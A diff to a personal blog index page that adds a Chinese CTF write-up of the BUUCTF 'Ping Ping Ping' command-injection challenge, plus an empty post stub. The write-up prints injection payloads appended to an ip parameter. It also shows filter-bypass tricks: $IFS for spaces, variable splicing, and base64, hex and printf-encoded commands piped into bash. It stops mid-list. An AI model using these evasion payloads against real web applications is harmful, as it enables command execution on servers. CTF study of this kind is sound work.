@@ -145,6 +145,143 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuzhangchi.github.io/2021/04/01/BUUpingpingping%E4%BB%A5%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Oops!">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wzc">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/01/BUUpingpingping%E4%BB%A5%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">BUUpingpingping以及命令执行相关知识</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-04-01 21:48:39 / Modified: 22:28:34" itemprop="dateCreated datePublished" datetime="2021-04-01T21:48:39+08:00">2021-04-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>#0×00 Ping PIng Ping<br>一开始看到这个题目还不知道是啥意思，后来百度了一下ping是个啥：</p>
+<p>PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序 [1]  。Ping是工作在 TCP/IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特网报文控制协议）Echo 请求报文，测试目的站是否可达及了解其有关状态。</p>
+<p>但是看了这个之后还是不知道要干啥，但是页面上有个  /?ip=  ，然后联想到之前做过的一个题，就输了一个/?ip=127.0.0.1,结果真的有回显。</p>
+<p>之后百度了一下别人的wp，了解到这题是一道命令执行，然后也大致了解了命令执行是个啥。</p>
+<p>先来说说这道题，既然这题是一道命令执行，那就来看看通过get方式能得到什么东西</p>
+<p>payload：/?ip=127.0.0.1|ls</p>
+<p>然后回显出flag.php和index.php</p>
+<p>这里试试能不能直接读到flag.php，payload：/?ip=127.0.0.1|cat flag.php</p>
+<p>居然出来个fuck your space，明显空格被过滤了</p>
+<p>去网上搜索了一下如何绕过空格，有如下几种：<br>&lt;&gt;</p>
+<p>%20(space)</p>
+<p>%09(tab)</p>
+<p>$IFS$9、 ${IFS}、$IFS<br>但是前三种都被过滤了，这里用第四种构造出payload：/?ip=127.0.01|cat$ifs$9flag.php</p>
+<p>但是这里我们并不能直接得到flag，因为回显显示出flag也被过滤了</p>
+<p>这里再试一试index.php，成功访问，得到被过滤的黑名单</p>
+<p>到这里之后，我们需要做的就是想办法绕过flag，得到flag.php</p>
+<p>这里有如下几种方式：<br>1.拼接绕过<br>a=fl;b=ag;$a$b<br>最后构造出的payload为：/?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php<br>为啥要把ag写在前面而把fl写在后面呢，就是吃了没有好好看代码的亏，如果你是先写了fl再写ag，实际上还是能和正则匹配匹配上的<br>其实还有更简单的：/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</p>
+<p>2.编码绕过（采用 | 来书写编码规则，可以是base64，hex和oct）<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag</p>
+<p>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag</p>
+<p>$(printf “\154\163”) ==&gt;ls<br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”) ==&gt;cat /flag<br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 ==&gt;cat /flag</p>
+<p>3.反斜杠和单双引号绕过：<br>ca’’t flag 或ca””t flag或ca\t fl\ag<br>但是这里单引号和双引号以及反斜杠都被过滤了</p>
+<p>4.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuzhangchi.github.io/2021/03/26/BUU%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Oops!">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wzc">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/26/BUU%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">BUU随便注</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-26 19:07:23" itemprop="dateCreated datePublished" datetime="2021-03-26T19:07:23+08:00">2021-03-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://wuzhangchi.github.io/2021/03/25/BUUBuyFlag/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -578,7 +715,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
